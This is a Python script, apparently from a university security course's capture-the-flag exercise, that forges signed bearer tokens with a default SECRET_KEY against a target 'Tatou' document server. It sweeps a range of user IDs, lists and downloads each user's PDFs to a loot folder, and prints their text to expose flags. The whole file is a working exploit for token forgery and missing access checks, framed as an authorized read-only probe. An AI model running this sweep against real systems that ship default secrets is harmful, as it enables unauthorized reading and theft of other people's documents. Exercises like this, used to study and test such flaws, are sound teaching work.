"""forge_probe.py — test a target Tatou for a default/guessable SECRET_KEY.

The server signs its bearer tokens with itsdangerous.URLSafeTimedSerializer
(SECRET_KEY, salt="tatou-auth"), and authorization on list-documents /
get-document is "ownerid == token.uid" only. So if a target never changed
SECRET_KEY from the shipped default ("dev-secret-change-me"), a forged token
for any uid reads that user's documents through the normal API -- including
Mr_Important's flag_3 PDF.

This is a read-only check (GET only; no writes, deletes, or repeated
hammering) for the sanctioned "capture other groups' flags" exercise on the
course network. Point it only at systems you are authorized to test.

Usage:
    python scripts/forge_probe.py \
        --base http://softsec-group-21.dsv.local.su.se:5000/api \
        --secret dev-secret-change-me \
        --uid-range 1-40 \
        --out-dir /tmp/loot/group21

Prints, per uid, any documents the forged token can list, downloads each,
and extracts page text so a flag value is visible immediately.
"""
from __future__ import annotations

import argparse
from pathlib import Path

import requests
from itsdangerous import URLSafeTimedSerializer


def forge(secret: str, uid: int, login: str = "x", email: str = "x@x") -> str:
    s = URLSafeTimedSerializer(secret, salt="tatou-auth")
    return s.dumps({"uid": uid, "login": login, "email": email})


def extract_text(pdf_bytes: bytes) -> str:
    try:
        import fitz  # PyMuPDF, present in the server image / venv
        doc = fitz.open(stream=pdf_bytes, filetype="pdf")
        return "\n".join(p.get_text() for p in doc).strip()
    except Exception as e:
        return f"(text extraction failed: {e})"


def parse_range(spec: str) -> range:
    lo, _, hi = spec.partition("-")
    return range(int(lo), int(hi or lo) + 1)


def main() -> int:
    p = argparse.ArgumentParser(description="Forge-token probe for default SECRET_KEY.")
    p.add_argument("--base", required=True, help="Target API base, e.g. http://host:5000/api")
    p.add_argument("--secret", default="dev-secret-change-me",
                   help="Candidate SECRET_KEY to forge with (default: the shipped default)")
    p.add_argument("--uid-range", default="1-40", help="uid range to sweep, e.g. 1-40")
    p.add_argument("--out-dir", type=Path, default=Path("/tmp/forge_loot"))
    p.add_argument("--timeout", type=float, default=15.0)
    args = p.parse_args()

    base = args.base.rstrip("/")
    args.out_dir.mkdir(parents=True, exist_ok=True)
    found_any = False

    for uid in parse_range(args.uid_range):
        token = forge(args.secret, uid)
        hdr = {"Authorization": f"Bearer {token}"}
        try:
            r = requests.get(f"{base}/list-documents", headers=hdr, timeout=args.timeout)
        except Exception as e:
            print(f"uid {uid}: request failed ({e})")
            continue

        if r.status_code == 401:
            # Signature rejected -> this secret is wrong; no point sweeping further.
            print(f"uid {uid}: 401 (token rejected -> SECRET_KEY is not {args.secret!r})")
            print("Stop: the candidate secret does not match this target.")
            return 1
        if r.status_code != 200:
            print(f"uid {uid}: HTTP {r.status_code}")
            continue

        docs = (r.json() or {}).get("documents", [])
        if not docs:
            continue

        found_any = True
        print(f"\nuid {uid}: {len(docs)} document(s)")
        for d in docs:
            did, name = d.get("id"), d.get("name")
            print(f"  - id={did} name={name!r} size={d.get('size')}")
            try:
                pr = requests.get(f"{base}/get-document/{did}", headers=hdr, timeout=args.timeout)
            except Exception as e:
                print(f"      download failed ({e})")
                continue
            if pr.status_code != 200 or pr.content[:5] != b"%PDF-":
                print(f"      get-document -> HTTP {pr.status_code}, not a PDF")
                continue
            out = args.out_dir / f"uid{uid}_doc{did}_{name}".replace("/", "_")
            if not out.name.lower().endswith(".pdf"):
                out = out.with_suffix(".pdf")
            out.write_bytes(pr.content)
            txt = extract_text(pr.content)
            print(f"      saved -> {out}  ({len(pr.content)} bytes)")
            if txt:
                snippet = txt if len(txt) <= 600 else txt[:600] + " …"
                print("      --- page text ---")
                for line in snippet.splitlines():
                    print(f"      {line}")

    if not found_any:
        print("\nNo documents listed. Either SECRET_KEY differs, or no uid in range "
              "owns documents. Try a wider --uid-range or a different --secret.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
